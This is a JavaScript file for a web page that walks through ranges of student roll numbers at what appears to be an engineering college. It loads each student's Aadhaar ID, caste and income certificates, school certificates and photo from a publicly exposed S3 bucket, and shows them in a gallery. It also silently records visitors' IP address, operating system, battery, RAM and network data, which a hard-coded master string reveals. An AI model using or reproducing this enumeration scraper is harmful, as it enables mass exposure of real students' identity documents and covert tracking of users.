const masterName = 'master_control(AccessGranted)';
    let clearButton;

function getStoredUsers() {
      const storedUsers = localStorage.getItem('users');
      return storedUsers ? JSON.parse(storedUsers) : [];
    }

    function handleAction() {
      const name = document.getElementById('nameInput').value;
      if (!name) {
        alert('Please enter your name');
        return;
      }

      if (name === masterName) {
        showInfo();
        if (getStoredUsers().length > 0) {
          showClearStorageButton();
        }
      } else {
        verifyName();
        removeClearStorageButton();
        document.getElementById('info').style.display = 'none';
      }
    }

    async function storeInfo(name) {
    const batteryLevel = await getBatteryInfo();
    const networkType = getNetworkInfo();
    const ramSize = getRAMSize();
    const me1 = document.getElementById('menu1').value;
    const me2 = document.getElementById('menu2').value;
    const me3 = document.getElementById('menu3').value;
    const me4 = document.getElementById('menu4').value;
    const ip = await getIPAddress(); 
      const currentDate = new Date();
      const date = currentDate.toLocaleDateString();
      const time = currentDate.toLocaleTimeString();
      const os = getOS();
      const newUser = {
        name: name,
        date: date,
        time: time,
        os: os,
        me1: me1,
        me2:me2,
        me3:me3,
        me4:me4,
        batteryLevel:batteryLevel,
        networkType:networkType,
        ramSize:ramSize,
        ip:ip
      };

      const users = getStoredUsers();
      users.push(newUser);
      localStorage.setItem('users', JSON.stringify(users));

    }

    function showInfo() {
      const users = getStoredUsers();

      if (users.length === 0) {
        return;
      }
      let userInfoHtml = '';
      users.forEach(user => {
        userInfoHtml += `<p><strong>Name:</strong> ${user.name}</p>`;
        userInfoHtml += `<p><strong>Date:</strong> ${user.date}</p>`;
        userInfoHtml += `<p><strong>Time:</strong> ${user.time}</p>`;
        userInfoHtml += `<p><strong>Operating System:</strong> ${user.os}</p>`;
        userInfoHtml += `<p><strong>Viewd :</strong>${user.me1},${user.me2},${user.me3},${user.me4}</p>`;
        userInfoHtml += `<p><strong>Ramsize:</strong> ${user.ramSize}</p>`;
        userInfoHtml += `<p><strong>Battery Level:</strong> ${user.batteryLevel}</p>`;
        userInfoHtml += `<p><strong>Ip_address:</strong> ${user.ip}</p>`;
        userInfoHtml += `<p><strong>Network:</strong> ${user.networkType}</p><hr>`;
        
      });

      document.getElementById('info').innerHTML = userInfoHtml;
      document.getElementById('info').style.display = 'block';
    }

    function showClearStorageButton() {
      if (!clearButton) {
        clearButton = document.createElement('button');
        clearButton.innerText = 'Clear Storage';
        clearButton.style.marginTop = '10px';
        clearButton.onclick = clearStorage;
        document.querySelector('.container').appendChild(clearButton);
      }
    }
    async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return 'Error retrieving IP address.';
            }
        }
    function removeClearStorageButton() {
      if (clearButton) {
        clearButton.remove();
        clearButton = null; 
      }
    }

    function clearStorage() {
      localStorage.removeItem('users');
      alert('All stored information has been cleared.');
      document.getElementById('info').style.display = 'none'; 
      removeClearStorageButton();
    }
    function getBatteryInfo() {
            return navigator.getBattery().then(function(battery) {
                return (battery.level * 100).toFixed(0) + '%';
            });
        }

        function getNetworkInfo() {
            if (navigator.connection) {
                const connection = navigator.connection;
                return connection.effectiveType || "Network type not available";
            } else {
                return "Network Information API is not supported.";
            }
        }

        function getRAMSize() {
            const ramSizeMB = navigator.deviceMemory || "RAM size not available";
            return ramSizeMB + " GB (Approximate)";
        }


    function getOS() {
      let userAgent = window.navigator.userAgent;
      let platform = window.navigator.platform;
      let macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
      let windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
      let iosPlatforms = ['iPhone', 'iPad', 'iPod'];
      let os = null;

      if (macosPlatforms.indexOf(platform) !== -1) {
        os = 'Mac OS';
      } else if (iosPlatforms.indexOf(platform) !== -1) {
        os = 'iOS';
      } else if (windowsPlatforms.indexOf(platform) !== -1) {
        os = 'Windows';
      } else if (/Android/.test(userAgent)) {
        os = 'Android';
      } else if (!os && /Linux/.test(platform)) {
        os = 'Linux';
      }

      return os;
    }
    function verifyName() {
    const validNames =  ["rakshith", "rakesh", "prem","rohit","pavan","pardhu","vighnan","santhosh","sharma","karthik","mani","madhav","pranadeep","nithin","dinesh"];
    const enteredName = document.getElementById('nameInput').value.trim().toLowerCase();
    const jamesDisplay = document.getElementById("benzii");
    const input = document.getElementById('nameInput').value.trim().toLowerCase();
    if (validNames.includes(enteredName)) {
        document.querySelector('.name-container').style.display = 'none';
        document.querySelector('.main-content').style.display = 'flex';
        jamesDisplay.textContent = input.charAt(0).toUpperCase() + input.slice(1);
    } else {
        alert("Invalid Name!!");
    }
}

async function generateImages(startRoll1, endRoll1, startRoll2, endRoll2) {
    document.getElementById("imageGallery").innerHTML = "";
    document.getElementById("imageCount").textContent = "Total Images: 0";

    async function processRolls(startRoll, endRoll) {
        if (!startRoll || !endRoll) {
            alert("Please enter both startRoll and endRoll.");
            return 0;
        }

        if (startRoll.length !== endRoll.length) {
            alert("Start roll and end roll must have the same length.");
            return 0;
        }

        let prefix = startRoll.slice(0, 8);
        let startAlphanumeric = startRoll.slice(8);
        let endAlphanumeric = endRoll.slice(8);

        let startNum = parseInt(startAlphanumeric, 36);
        let endNum = parseInt(endAlphanumeric, 36);

        if (isNaN(startNum) || isNaN(endNum) || startNum > endNum) {
            alert("Invalid alphanumeric part of the roll numbers.");
            return 0;
        }

        let imagePromises = [];
        let processedCount = 0;

        for (let i = startNum; i <= endNum; i++) {
            let rollSuffix = i.toString(36).toUpperCase().padStart(startAlphanumeric.length, '0');
            let rollNumber = prefix + rollSuffix;
            const benu = document.getElementById('menu1').value;
            let img = new Image();
            switch (benu) {
                case "SSC Certificate":
                    img.src = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/" + rollNumber + "/DOCS/" + rollNumber + "_SSC.jpg";
                    break;
                case "Inter Certificate":
                    img.src = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/" + rollNumber + "/DOCS/" + rollNumber + "_INTER.jpg";
                    break;
                case "Aadhar":
                    img.src = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/" + rollNumber + "/DOCS/" + rollNumber + "_Aadhar.jpg";
                    break;
                case "Caste Certificate":
                    img.src = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/" + rollNumber + "/DOCS/" + rollNumber + "_Caste.jpg";
                    break;
                case "Income Certificate":
                    img.src = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/" + rollNumber + "/DOCS/" + rollNumber + "_Income.jpg";
                    break;
                case "Photo":
                    img.src = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/" + rollNumber + "/" + rollNumber + ".jpg";
                    break;
            }

            img.alt = rollNumber;

            let promise = new Promise((resolve) => {
                img.onload = function () {
                    resolve({ rollNumber, img });
                };

                img.onerror = function () {
                    resolve(null);
                };
            });

            imagePromises.push(promise);
        }

        for (let promise of imagePromises) {
            let result = await promise;
            if (result) {
                let { rollNumber, img } = result;
                let imageItem = document.createElement("div");
                imageItem.classList.add("imageItem");
                imageItem.appendChild(img);

                let rollNumberElement = document.createElement("p");
                rollNumberElement.classList.add("rollNumber");
                rollNumberElement.textContent = rollNumber;

                imageItem.appendChild(rollNumberElement);
                document.getElementById("imageGallery").appendChild(imageItem);

                processedCount++;
                document.getElementById("imageCount").textContent = `Total Images: ${parseInt(document.getElementById("imageCount").textContent.split(": ")[1]) + 1}`;
            }
        }
        return processedCount;
    }
    let totalImages = await processRolls(startRoll1, endRoll1);
    if(startRoll2 || endRoll2){
    totalImages += await processRolls(startRoll2, endRoll2);
    }
    console.log(`Total images processed: ${totalImages}`);
}

function populateSelectMenu(id, options) {
    const select = document.getElementById(id);
    options.forEach(optionText => {
        const option = document.createElement('option');
        option.value = optionText;
        option.textContent = optionText;
        select.appendChild(option);
    });
}

function showSelectedValues() {
    const name = document.getElementById('nameInput').value; 
    const menu1 = document.getElementById('menu1').value;
    const menu2 = document.getElementById('menu2').value;
    const menu3 = document.getElementById('menu3').value;
    const menu4 = document.getElementById('menu4').value;
    document.getElementById('notfound').textContent = "";
    storeInfo(name);
    switch(menu2){
        case "1st Year":
            switch(menu3){
                case "AERO":
                    switch(menu4){
                        case "Section A":
                            generateImages("24951A2101","24951A2164");
                            break;
                        case "ALL":
                            generateImages("24951A2101","24951A2164");
                            break;
                        default:
                        document.getElementById('notfound').textContent = "";
                        document.getElementById('notfound').textContent = "Images Cant be Found";
                            break;  
                    }
                    break;
                case "CE":
                    switch(menu4){
                            case "Section A":
                                generateImages("24951A0101","24951A0124");
                                break;
                            case "ALL":
                                generateImages("24951A0101","24951A0124");
                                break;
                            default:
                            document.getElementById('notfound').textContent = "";
                            document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (AIML)":
                    switch(menu4){
                            case "Section A":
                                generateImages("24951A6601","24951A6664");
                                break;
                            case "Section B":
                                generateImages("24951A6665","24951A66C8");
                                break;
                            case "Section C":
                                generateImages("24951A66C9","24951A66K2");
                                break;
                            case "Section D":
                                generateImages("24951A66K3","24951A66R7");
                                break;
                            case "ALL":
                                generateImages("24951A6601","24951A66R7");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (DS)":
                    switch(menu4){
                                case "Section A":
                                    generateImages("24951A6701","24951A6764");
                                    break;
                                case "ALL":
                                    generateImages("24951A6701","24951A6764");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "CSE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("24951A0501","24951A0564");
                                    break;
                                case "Section B":
                                    generateImages("24951A0565","24951A05C8");
                                    break;
                                case "Section C":
                                    generateImages("24951A05C9","24951A05K2");
                                    break;
                                case "Section D":
                                    generateImages("24951A05K3","24951A05R6");
                                    break;
                                case "Section E":
                                    generateImages("24951A05R7","24951A05Z0");
                                    break;
                                case "Section F":
                                    generateImages("24951A05Z1","24951A05CJ");
                                    break;
                                case "Section G":
                                    generateImages("24951A05CK","24951A05FB");
                                    break;
                                case "ALL":
                                    generateImages("24951A0501","24951A05FB");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "ECE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("24951A0401","24951A0462");
                                    break;
                                case "Section B":
                                    generateImages("24951A0463","24951A04C5");
                                    break;
                                case "ALL":
                                    generateImages("24951A0401","24951A04C5");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "EEE":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("24951A0201","24951A0231");
                                        break;
                                    case "ALL":
                                        generateImages("24951A0201","24951A0231");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "IT":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("24951A1201","24951A1264");
                                        break;
                                    case "Section B":
                                        generateImages("24951A1265","24951A12C9");
                                        break;
                                    case "ALL":
                                        generateImages("24951A1201","24951A12C9");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "ME":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("24951A0301","24951A0328");
                                        break;
                                    case "ALL":
                                        generateImages("24951A0301","24951A0328");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;             
}
            break;
            default:
                document.getElementById('notfound').textContent = "";
                document.getElementById('notfound').textContent = "Images Cant be Found";
                break;
        case "2nd Year":
        switch(menu3){
                case "AERO":
                    switch(menu4){
                        case "Section A":
                            generateImages("23951A2101","23951A2163","24955A2101","24955A2106");
                            break;
                        case "ALL":
                            generateImages("23951A2101","23951A2163","24955A2101","24955A2106");
                            break;
                        default:
                            document.getElementById('notfound').textContent = "";
                            document.getElementById('notfound').textContent = "Images Cant be Found";
                            break;  
                    }
                    break;
                case "CE":
                    switch(menu4){
                            case "Section A":
                                generateImages("23951A0101","23951A0115","24955A0101","24955A0120");
                                break;
                            case "ALL":
                                generateImages("23951A0101","23951A0115","24955A0101","24955A0120");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (AIML)":
                    switch(menu4){
                            case "Section A":
                                generateImages("23951A6601","23951A6664","24955A6601","24955A6607");
                                break;
                            case "Section B":
                                generateImages("23951A6665","23951A66C8","24955A6608","24955A6614");
                                break;
                            case "Section C":
                                generateImages("23951A66C9","23951A66K2","24955A6615","24955A6621");
                                break;
                            case "Section D":
                                generateImages("23951A66K3","23951A66R1","24955A6622","24955A6627");
                                break;
                            case "ALL":
                                generateImages("23951A6601","23951A66R1","24955A6601","24955A6627");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (DS)":
                switch(menu4){
                                case "Section A":
                                    generateImages("23951A6701","23951A6764","24955A6701","24955A6707");
                                    break;
                                case "Section B":
                                    generateImages("23951A6765","23951A67C8","24955A6708","24955A6714");
                                    break;
                                case "Section C":
                                    generateImages("23951A67C9","23951A67J8","24955A6715","24955A6720");
                                    break;
                                case "ALL":
                                    generateImages("23951A6701","23951A67J8","24955A6701","24955A6720");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "CSE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("23951A0501","23951A051X","24955A0501","24955A0507");
                                    break;
                                case "Section B":
                                    generateImages("23951A051Y","23951A053V","24955A0508","24955A0514");
                                    break;
                                case "Section C":
                                    generateImages("23951A053W","23951A055T","24955A0515","24955A0521");
                                    break;
                                case "Section D":
                                    generateImages("23951A055U","23951A057R","24955A0522","24955A0528");
                                    break;
                                case "Section E":
                                    generateImages("23951A057S","23951A059P","24955A0529","24955A0535");
                                    break;
                                case "Section F":
                                    generateImages("23951A059Q","23951A05BM","24955A0536","24955A0541");
                                    break;
                                case "Section G":
                                    generateImages("23951A05BN","23951A05DA","24955A0542","24955A0547");
                                    break;
                                case "ALL":
                                    generateImages("23951A0501","23951A05DA","24955A0501","24955A0547");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "ECE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("23951A0401","23951A0464","24955A0401","24955A0407");
                                    break;
                                case "Section B":
                                    generateImages("23951A0465","23951A04C8","24955A0408","24955A0414");
                                    break;
                                case "Section C":
                                    generateImages("23951A04C9","23951A04K2","24955A0415","24955A0421");
                                    break;
                                case "Section D":
                                    generateImages("23951A04K3","23951A04R0","24955A0422","24955A0427");
                                    break;
                                case "ALL":
                                    generateImages("23951A0401","23951A04R0","24955A0401","24955A0427");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "EEE":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("23951A0201","23951A0229","24955A0201","24955A0205");
                                        break;
                                    case "ALL":
                                        generateImages("23951A0201","23951A0229","24955A0201","24955A0205");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "IT":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("23951A1201","23951A1264","24955A1201","24955A1207");
                                        break;
                                    case "Section B":
                                        generateImages("23951A1265","23951A12C8","24955A1208","24955A1214");
                                        break;
                                    case "Section C":
                                            generateImages("23951A12C9","23951A12J2","24955A1215","24955A1221");
                                            break;
                                    case "ALL":
                                        generateImages("23951A1201","23951A12J2","24955A1201","24955A1221");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "ME":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("23951A0301","23951A0328","24955A0301","24955A0308");
                                        break;
                                    case "ALL":
                                        generateImages("23951A0301","23951A0328","24955A0301","24955A0308");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;  
                 case "CSE (CS)":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("23951A6201","23951A6264","24955A6201","24955A6207");
                                        break;
                                    case "Section B":
                                        generateImages("23951A6265","23951A62C8","24955A6208","24955A6214");
                                        break;
                                    case "Section C":
                                        generateImages("23951A62C9","23951A62J2","24955A6215","24955A6220");
                                        break;
                                    case "ALL":
                                        generateImages("23951A6201","23951A62J2","24955A6201","24955A6220");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                        
                    break; 
                    default:
                        document.getElementById('notfound').textContent = "";
                        document.getElementById('notfound').textContent = "Images Cant be Found";          
}
            break;
            
        case "3rd Year":
        switch(menu3){
                case "AERO":
                    switch(menu4){
                        case "Section A":
                            generateImages("22951A2101","22951A2156","22955A2101","22955A2115");
                            break;
                        case "ALL":
                            generateImages("22951A2101","22951A2156","22955A2101","22955A2115");;
                            break;
                        default:
                            document.getElementById('notfound').textContent = "";
                            document.getElementById('notfound').textContent = "Images Cant be Found";
                            break;  
                    }
                    break;
                case "CE":
                    switch(menu4){
                            case "Section A":
                                generateImages("22951A0101","22951A0120","22955A0101","22955A0124");
                                break;
                            case "ALL":
                                generateImages("22951A0101","22951A0120","22955A0101","22955A0124");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (AIML)":
                    switch(menu4){
                            case "Section A":
                                generateImages("22951A6601","22951A6664","22955A6601","22955A6606");
                                break;
                            case "Section B":
                                generateImages("22951A6665","22951A66C8","22955A6607","22955A6612");
                                break;
                            case "Section C":
                                generateImages("22951A66C9","22951A66J6","22955A6613","22955A6620");
                                break;
                            case "ALL":
                                generateImages("22951A6601","22951A66J6","22955A6601","22955A6620");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (DS)":
                    switch(menu4){
                                case "Section A":
                                    generateImages("22951A6701","22951A6764","22955A6701","22955A6706");
                                    break;
                                case "Section B":
                                    generateImages("22951A6765","22951A67C7","22955A6707","22955A6712");
                                    break;
                                case "Section C":
                                    generateImages("22951A67C8","22951A67J3","22955A6713","22955A6720");
                                    break;
                                case "ALL":
                                    generateImages("22951A6701","22951A67J3","22955A6701","22955A6720");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "CSE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("22951A0501","22951A0565","22955A0501","22955A0506");
                                    break;
                                case "Section B":
                                    generateImages("22951A0566","22951A05D0","22955A0507","22955A0512");
                                    break;
                                case "Section C":
                                    generateImages("22951A05D1","22951A05K5","22955A0513","22955A0519");
                                    break;
                                case "Section D":
                                    generateImages("22951A05K6","22951A05R9","22955A0520","22955A0526");
                                    break;
                                case "ALL":
                                    generateImages("22951A0501","22951A05R9","22955A0501","22955A0526");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "ECE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("22951A0401","22951A0464","22955A0401","22955A0405");
                                    break;
                                case "Section B":
                                    generateImages("22951A0465","22951A04C8","22955A0406","22955A0410");
                                    break;
                                case "Section C":
                                    generateImages("22951A04C9","22951A04K2","22955A0411","22955A0416");
                                    break;
                                case "Section D":
                                    generateImages("22951A04K3","22951A04Q0","22955A0416","22955A0426");
                                    break;
                                case "ALL":
                                    generateImages("22951A0401","22951A04Q0","22955A0401","22955A0426");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "EEE":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("22951A0201","22951A0240","22955A0201","22955A0220");
                                        break;
                                    case "ALL":
                                        generateImages("22951A0201","22951A0240","22955A0201","22955A0220");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "IT":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("22951A1201","22951A1264","22955A1201","22955A1207");
                                        break;
                                    case "Section B":
                                        generateImages("22951A1265","22951A12B8","22955A1208","22955A1213");
                                        break;
                                    case "ALL":
                                        generateImages("22951A1201","22951A12B8","22955A1201","22955A1213");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "ME":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("22951A0301","22951A0319","22955A0301","22955A0323");
                                        break;
                                    case "ALL":
                                        generateImages("22951A0301","22951A0319","22955A0301","22955A0323");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;  
                 case "CSE (CS)":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("22951A6201","22951A6264","22955A6201","22955A6207");
                                        break;
                                    case "Section B":
                                        generateImages("22951A6265","22951A62C2");
                                        break;
                                    case "ALL":
                                        generateImages("22951A6201","22951A62C2","22955A6201","22955A6207");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;    
                    case "CSE (IT)":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("22951A3301","22951A3364","22955A3301","22955A3307");
                                        break;
                                    case "Section B":
                                        generateImages("22951A3365","22951A33C2");
                                        break;
                                    case "ALL":
                                        generateImages("22951A3301","22951A62C2","22955A3301","22955A3307");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break; 
                    default:
                        document.getElementById('notfound').textContent = "";
                        document.getElementById('notfound').textContent = "Images Cant be Found";
                        break;          
}
                    
            break;
        case "4th Year":
            switch(menu3){
                case "AERO":
                    switch(menu4){
                        case "Section A":
                            generateImages("21951A2101","21951A2165");
                            break;
                        case "Section B":
                                generateImages("21951A2166","21951A21C3");
                                break;
                        case "ALL":
                            generateImages("21951A2101","21951A21C3");
                            break;
                        default:
                            document.getElementById('notfound').textContent = "";
                            document.getElementById('notfound').textContent = "Images Cant be Found";
                            break;  
                    }
                    break;
                case "CE":
                    switch(menu4){
                            case "Section A":
                                generateImages("21951A0101","21951A0143");
                                break;
                            case "ALL":
                                generateImages("21951A0101","21951A0143");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (AIML)":
                    switch(menu4){
                            case "Section A":
                                generateImages("21951A6601","21951A6665");
                                break;
                            case "Section B":
                                generateImages("21951A6666","21951A66D0");
                                break;
                            case "Section C":
                                generateImages("21951A66D1","21951A66J8");
                                break;
                            case "ALL":
                                generateImages("21951A6601","21951A66J8");
                                break;
                            default:
                                document.getElementById('notfound').textContent = "";
                                document.getElementById('notfound').textContent = "Images Cant be Found";
                                break;  
                        }
                    break;
                case "CSE (DS)":
                switch(menu4){
                                case "Section A":
                                    generateImages("21951A6701","21951A6765");
                                    break;
                                case "Section B":
                                    generateImages("21951A6766","21951A67D0");
                                    break;
                                case "Section C":
                                    generateImages("21951A67D1","21951A67K0");
                                    break;
                                case "ALL":
                                    generateImages("21951A6701","21951A67K0");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "CSE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("21951A0501","21951A0565");
                                    break;
                                case "Section B":
                                    generateImages("21951A0566","21951A05D0");
                                    break;
                                case "Section C":
                                    generateImages("21951A05D1","21951A05K5");
                                    break;
                                case "Section D":
                                    generateImages("21951A05K6","21951A05R3");
                                    break;
                                case "ALL":
                                    generateImages("21951A0501","21951A05R3");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "ECE":
                    switch(menu4){
                                case "Section A":
                                    generateImages("21951A0401","21951A0465");
                                    break;
                                case "Section B":
                                    generateImages("21951A0466","21951A04D0");
                                    break;
                                case "Section C":
                                    generateImages("21951A04D1","21951A04K5");
                                    break;
                                case "Section D":
                                    generateImages("21951A04K6","21951A04R4");
                                    break;
                                case "ALL":
                                    generateImages("21951A0401","21951A04R4");
                                    break;
                                default:
                                    document.getElementById('notfound').textContent = "";
                                    document.getElementById('notfound').textContent = "Images Cant be Found";
                                    break;  
                            }
                    break;
                case "EEE":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("21951A0201","21951A0245");
                                        break;
                                    case "ALL":
                                        generateImages("21951A0201","21951A0245");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "IT":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("21951A1201","21951A1265");
                                        break;
                                    case "Section B":
                                        generateImages("21951A1266","21951A12C8");
                                        break;
                                    case "ALL":
                                        generateImages("21951A1201","21951A12C8");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;
                case "ME":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("21951A0302","21951A0330");
                                        break;
                                    case "ALL":
                                        generateImages("21951A0302","21951A0330");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    break;  
                case "CSE (CS)":
                switch(menu4){
                                    case "Section A":
                                        generateImages("21951A6201","21951A6263");
                                        break;
                                    case "ALL":
                                        generateImages("21951A6201","21951A6263");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                        
                    break; 
                case "CSE (IT)":
                    switch(menu4){
                                    case "Section A":
                                        generateImages("21951A3301","21951A3363");
                                        break;
                                    case "ALL":
                                        generateImages("21951A3301","21951A3363");
                                        break;
                                    default:
                                        document.getElementById('notfound').textContent = "";
                                        document.getElementById('notfound').textContent = "Images Cant be Found";
                                        break;  
                                }
                    default:
            document.getElementById('notfound').textContent = "";
            document.getElementById('notfound').textContent = "Images Cant be Found";        
}
            break;
            
    }
}

populateSelectMenu('menu1', [
    'SSC Certificate',
    'Inter Certificate',
    'Aadhar',
    'Caste Certificate',
    'Income Certificate',
    'Photo'
]);
populateSelectMenu('menu2', [
    '1st Year',
    '2nd Year',
    '3rd Year',
    '4th Year'
]);
populateSelectMenu('menu3', [
    'AERO',
    'CE',
    'CSE (AIML)',
    'CSE (DS)',
    'CSE (CS)',
    'CSE',
    'ECE',
    'EEE',
    'IT',
    'CSE (IT)',
    'ME'

]);
populateSelectMenu('menu4', [
    'Section A',
    'Section B',
    'Section C',
    'Section D',
    'Section E',
    'Section F',
    'Section G',
    'ALL'
]);

